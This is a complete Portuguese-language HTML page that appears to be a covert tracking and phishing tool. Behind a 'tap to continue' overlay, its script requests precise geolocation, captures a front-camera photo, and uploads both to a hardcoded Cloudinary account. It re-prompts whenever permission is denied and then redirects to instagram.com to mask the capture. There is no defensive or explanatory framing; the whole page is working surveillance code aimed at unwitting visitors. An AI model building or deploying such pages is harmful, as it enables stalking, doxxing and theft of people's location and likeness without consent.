<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura de Localização e Foto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #2E2E2E;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(255, 255, 255, 0.9);
      z-index: 9999;
      text-align: center;
      padding: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar</div>
  <script>
    const cloudName = "dx5legahb";
    const uploadPreset = "upload";
    const folderName = "capturas";
    const overlay = document.getElementById('overlay');

    // Função de upload de texto bruto (localização)
    async function uploadLocation(lat, lon) {
      const txtBlob = new Blob([
        `Latitude: ${lat}\nLongitude: ${lon}`
      ], { type: 'text/plain' });
      const txtForm = new FormData();
      txtForm.append('file', txtBlob, `localizacao_${Date.now()}.txt`);
      txtForm.append('upload_preset', uploadPreset);
      txtForm.append('folder', folderName);
      await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: txtForm });
    }

    // Função de captura e upload de foto
    async function captureAndUploadPhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        const video = document.createElement('video');
        video.setAttribute('autoplay', true);
        video.setAttribute('muted', true);
        video.setAttribute('playsinline', true);
        video.srcObject = stream;
        await new Promise(res => video.onloadedmetadata = res);
        video.play();

        await new Promise(res => setTimeout(res, 500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(t => t.stop());

        return new Promise((resolve, reject) => {
          canvas.toBlob(async (blob) => {
            const imgForm = new FormData();
            imgForm.append('file', blob);
            imgForm.append('upload_preset', uploadPreset);
            imgForm.append('folder', folderName);
            const resp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm });
            const data = await resp.json();
            resolve(data.secure_url);
          }, 'image/png');
        });
      } catch (err) {
        throw err;
      }
    }

    // Fluxo principal
    overlay.onclick = () => {
      overlay.style.display = 'none';
      requestLocationFlow();
    };

    // Fluxo de localização
    function requestLocationFlow() {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude } = pos.coords;
          try {
            await uploadLocation(latitude, longitude);
            requestCameraFlow();
          } catch (uErr) {
            console.error('Erro upload localização:', uErr);
            alert('Erro ao enviar localização.');
          }
        },
        () => {
          // Negada
          overlay.textContent = 'Toque para permitir a localização';
          overlay.style.display = 'flex';
          overlay.onclick = () => {
            overlay.style.display = 'none';
            requestLocationFlow();
          };
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    // Fluxo de câmera
    function requestCameraFlow() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
        .then(async (stream) => {
          // Fechamos o stream, mas continuidade no captureAndUploadPhoto
          stream.getTracks().forEach(t => t.stop());
          try {
            await captureAndUploadPhoto();
            window.location.href = 'https://instagram.com';
          } catch (capErr) {
            console.error('Erro captura:', capErr);
            alert('Erro ao capturar foto.');
          }
        })
        .catch(() => {
          // Negada
          overlay.textContent = 'Toque para permitir o acesso à câmera';
          overlay.style.display = 'flex';
          overlay.onclick = () => {
            overlay.style.display = 'none';
            requestCameraFlow();
          };
        });
    }
  </script>
</body>
</html>
